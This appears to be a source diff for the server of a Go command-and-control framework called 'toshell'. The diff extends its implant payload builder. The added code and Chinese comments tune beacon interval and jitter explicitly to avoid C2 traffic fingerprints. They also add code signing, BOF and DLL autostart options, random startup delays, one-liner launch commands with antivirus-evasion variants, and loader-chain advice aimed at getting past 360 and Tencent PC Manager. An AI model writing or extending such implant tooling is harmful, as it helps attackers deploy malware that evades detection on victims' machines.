@@ -20,6 +20,44 @@ import (
 	"toshell/internal/server/logging"
 )
 
+// effectiveImplantDefaults 返回「构建请求里对应字段留 0 时，服务端实际会用的值」。
+// 生成载荷页把这些值显示成输入框的 placeholder，用户留空即等于"跟随设置页"。
+// ⚠️ 这里的回退口径必须与 createBuilderHandler 中的归一化分支保持一致。
+func (s *Server) effectiveImplantDefaults() map[string]uint32 {
+	d := map[string]uint32{}
+	if s.cfg != nil {
+		d["interval"] = s.cfg.Implant.Interval
+		d["jitter"] = s.cfg.Implant.Jitter
+		d["retry_wait"] = s.cfg.Implant.RetryWait
+		// 启动延迟在配置里是 int，且**没有"不延迟"的表示法**（<=0 一律视为未设置），
+		// 这里原样复刻 builder.go 的归一化顺序，保证页面显示的值 = 真正烘焙进载荷的值。
+		min, max := s.cfg.Implant.StartupDelayMin, s.cfg.Implant.StartupDelayMax
+		if max < min {
+			max = min
+		}
+		if max <= 0 {
+			min, max = 2, 10
+		}
+		if min <= 0 {
+			min = 2
+		}
+		d["startup_delay_min"] = uint32(min)
+		d["startup_delay_max"] = uint32(max)
+	}
+	if d["interval"] == 0 {
+		d["interval"] = 60
+	}
+	if d["jitter"] == 0 {
+		d["jitter"] = 20
+	}
+	if d["retry_wait"] == 0 {
+		d["retry_wait"] = 5
+	}
+	// retry_count 没有服务端配置项（设置页里也没有），回退值是硬编码的 3。
+	d["retry_count"] = 3
+	return d
+}
+
 func (s *Server) listBuildersHandler(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", "application/json")
 
@@ -61,15 +99,56 @@ func (s *Server) listBuildersHandler(w http.ResponseWriter, r *http.Request) {
 			"c_message": cMessage,
 		},
 		"options": map[string]interface{}{
-			"interval":    map[string]uint32{"min": 1, "max": 300, "default": 60},
-			"jitter":      map[string]uint32{"min": 0, "max": 100, "default": 10},
+			"interval": map[string]uint32{"min": 1, "max": 300, "default": 60},
+			// 抖动默认 20%：心跳间隔随机化，避免"固定周期轮询"这种典型 C2 指纹
+			"jitter":      map[string]uint32{"min": 0, "max": 100, "default": 20},
 			"retry_count": map[string]uint32{"min": 0, "max": 10, "default": 3},
 			"retry_wait":  map[string]uint32{"min": 1, "max": 60, "default": 5},
 		},
+		// 植入端默认参数 = 「设置 → 植入端默认参数」里配的值，且**按构建时的归一化规则算好**。
+		// 生成载荷页对应输入框留空（前端发 0）时，服务端就用这里的值。前端把本字段当成
+		// 输入框的 placeholder 显示，用户就不用"设置里配一遍、构建页再填一遍"了。
+		// ⚠️ 改这里务必同步 createBuilderHandler 里的归一化分支（两处口径必须一致）。
+		"implant_defaults": s.effectiveImplantDefaults(),
 		"evasion": map[string]interface{}{
 			"garble_available": garbleAvail,
 			"garble_message":   garbleMsg,
 			"upx_available":    upxAvail,
+			// 代码签名能力（是否已配置证书、用的哪套签名栈），供生成载荷页展示与提示
+			"sign_configured": func() bool {
+				if s.builder == nil {
+					return false
+				}
+				ok, _ := s.builder.SignStatus()
+				return ok
+			}(),
+			"sign_message": func() string {
+				if s.builder == nil {
+					return ""
+				}
+				_, msg := s.builder.SignStatus()
+				return msg
+			}(),
+			// BOF 默认关闭：需要跑 BOF 时在页面上勾选（会带上一整套 Beacon* API 名字）
+			"bof_default": false,
+			// DLL 载荷可用性：**按目标架构分别返回**（c-shared 需要与架构一致的 mingw gcc：
+			// x64 要 x86_64-w64-mingw32-gcc。只有 i686 时前端应当场提示，而不是等构建失败）
+			"dll_available": func() bool {
+				ok, _ := builder.DLLStatus("amd64")
+				return ok
+			}(),
+			"dll_message": func() string {
+				_, msg := builder.DLLStatus("amd64")
+				return msg
+			}(),
+			"dll_arch": func() map[string]interface{} {
+				out := map[string]interface{}{}
+				for _, a := range []string{"amd64", "386", "arm64"} {
+					ok, msg := builder.DLLStatus(a)
+					out[a] = map[string]interface{}{"available": ok, "message": msg}
+				}
+				return out
+			}(),
 		},
 	})
 }
@@ -80,6 +159,14 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, `{"error":"Method not allowed"}`, http.StatusMethodNotAllowed)
 		return
+	}
+
+	// 构建是长耗时操作（首次拉依赖 / garble 混淆 30~90s / UPX 压缩），
+	// 默认的 server.write_timeout（30s）会在构建完成前掐断响应 —— 表现为客户端
+	// "connection closed unexpectedly"，而服务端其实已经构建成功（日志可见
+	// "Payload built"）。这里为本请求单独放宽写超时。
+	if rc := http.NewResponseController(w); rc != nil {
+		_ = rc.SetWriteDeadline(time.Now().Add(30 * time.Minute))
 	}
 
 	var req BuildRequest
@@ -94,14 +181,29 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 	if req.Format == "" {
 		req.Format = "exe"
 	}
+	// 心跳间隔/抖动缺省值：**优先跟随服务端配置**（listener/implant 设置页），
+	// 只有配置也没给才回退内置默认。旧实现硬编码 5s/2%，会把"设置页里配的
+	// 60s 心跳"悄悄改回 5s —— 固定 5s 轮询是最典型的 C2 行为特征。
 	if req.Interval == 0 {
-		req.Interval = 5
+		req.Interval = s.cfg.Implant.Interval
+	}
+	if req.Interval == 0 {
+		req.Interval = 60
 	}
 	if req.Jitter == 0 {
-		req.Jitter = 2
+		req.Jitter = s.cfg.Implant.Jitter
+	}
+	if req.Jitter == 0 {
+		req.Jitter = 20 // 默认 ±20% 抖动：打破固定节奏的流量指纹
 	}
 	if req.RetryCount == 0 {
 		req.RetryCount = 3
+	}
+	// 重试间隔同理：先跟随服务端配置（implant.retry_wait），配置也没给才回退 5s。
+	// （此前这里直接硬编码 5，导致设置页把 retry_wait 配成别的值时不生效 ——
+	//  与 effectiveImplantDefaults() 报给生成载荷页的 placeholder 对不上。）
+	if req.RetryWait == 0 {
+		req.RetryWait = s.cfg.Implant.RetryWait
 	}
 	if req.RetryWait == 0 {
 		req.RetryWait = 5
@@ -147,12 +249,21 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		XORKeySize:   req.XORKeySize,
 		GarbleEnable: req.GarbleEnable,
 		UPXEnable:    req.UPXEnable,
+		EvasionScan:  req.EvasionScan,
+		BofEnabled:   req.BofEnabled,
+		SignEnabled:  req.SignEnabled,
+		// DLL：导出名与"加载即启动"（仅 format=dll 生效；dll_autostart 缺省 true）
+		DLLExport:    req.DLLExport,
+		DLLAutoStart: req.DLLAutoStart == nil || *req.DLLAutoStart,
+		// 启动随机延迟：0 = 交给 builder 取服务端配置 / 内置默认
+		StartDelayMin: req.StartupDelayMin,
+		StartDelayMax: req.StartupDelayMax,
 	}
 
 	result, err := s.builder.Build(opts)
 	if err != nil {
 		logging.Error("builder", "Build failed: %v", err)
-		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
+		writeJSONError(w, http.StatusInternalServerError, err.Error())
 		return
 	}
 
@@ -182,8 +293,16 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 		BuildTime:   result.BuildTime.Format(time.RFC3339),
 		DownloadURL: fmt.Sprintf("/api/v1/implants/stored/%s", buildID),
 	}
+	// 代码签名结果：把"签没签上、谁签的、为什么没签"如实带回给前端与调用方
+	if result.Sign != nil {
+		response.Signed = result.Sign.Signed
+		response.Signer = result.Sign.Signer
+		response.SignMethod = result.Sign.Method
+		response.SignStatus = result.Sign.Status
+		response.SignMessage = result.Sign.Message
+	}
 	// 一键上线命令：地址由服务端按目标机可达性解析（见 oneliner.go），
-	// 并一次性给出多套免杀变体，前端只负责展示。
+	// 并一次性给出多套免杀变体（含加载器链），前端只负责展示。
 	if set := s.oneLinerSet(r, req.ServerURL, req.OS, req.Format, buildID, req.DownloadHost); set != nil {
 		response.OneLinerHost = set.Host
 		response.OneLinerBase = set.BaseURL
@@ -193,6 +312,16 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 			response.OneLiner = set.Variants[0].Command
 		}
 	}
+
+	// 落地链建议：按平台/格式 + 本次产物是否已签名，给出"该走哪条链、为什么"。
+	// 依据是实测结论：未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行并删除。
+	targetOS := req.OS
+	if targetOS == "" {
+		targetOS = "windows"
+	}
+	adviceTitle, adviceTips := LoaderAdvice(targetOS, req.Format, response.Signed)
+	response.LoaderAdviceTitle = adviceTitle
+	response.LoaderAdviceTips = adviceTips
 
 	implantDir := s.cfg.Implant.OutputDir
 	if implantDir == "" {
@@ -222,15 +351,18 @@ func (s *Server) createBuilderHandler(w http.ResponseWriter, r *http.Request) {
 	if db := database.Get(); db != nil {
 		now := time.Now().Unix()
 		optsJSON, _ := json.Marshal(map[string]interface{}{
-			"interval":      req.Interval,
-			"jitter":        req.Jitter,
-			"retry_count":   req.RetryCount,
-			"retry_wait":    req.RetryWait,
-			"kill_date":     req.KillDate,
-			"working_hours": req.WorkingHours,
-			"xor_encrypt":   req.XOREncrypt,
-			"garble":        req.GarbleEnable,
-			"upx":           req.UPXEnable,
+			"interval":          req.Interval,
+			"jitter":            req.Jitter,
+			"retry_count":       req.RetryCount,
+			"retry_wait":        req.RetryWait,
+			"kill_date":         req.KillDate,
+			"working_hours":     req.WorkingHours,
+			"xor_encrypt":       req.XOREncrypt,
+			"garble":            req.GarbleEnable,
+			"upx":               req.UPXEnable,
+			"evasion_scan":      req.EvasionScan,
+			"startup_delay_min": opts.StartDelayMin,
+			"startup_delay_max": opts.StartDelayMax,
 		})
 		db.CreateImplant(&database.StoredImplant{
 			ID:          response.ID,
@@ -639,7 +771,7 @@ func (s *Server) listImplantsHandler(w http.ResponseWriter, r *http.Request) {
 			json.NewEncoder(w).Encode(map[string]interface{}{"implants": []interface{}{}})
 			return
 		}
-		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
+		writeJSONError(w, http.StatusInternalServerError, err.Error())
 		return
 	}
 
@@ -708,7 +840,7 @@ func (s *Server) deleteStoredImplantHandler(w http.ResponseWriter, r *http.Reque
 	if strings.HasPrefix(id, "file:") {
 		filePath := filepath.Join(implantDir, strings.TrimPrefix(id, "file:"))
 		if err := os.Remove(filePath); err != nil && !os.IsNotExist(err) {
-			http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
+			writeJSONError(w, http.StatusInternalServerError, err.Error())
 			return
 		}
 		json.NewEncoder(w).Encode(map[string]interface{}{
@@ -736,7 +868,7 @@ func (s *Server) deleteStoredImplantHandler(w http.ResponseWriter, r *http.Reque
 
 	// Delete from database
 	if err := db.DeleteImplant(id); err != nil {
-		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
+		writeJSONError(w, http.StatusInternalServerError, err.Error())
 		return
 	}
 
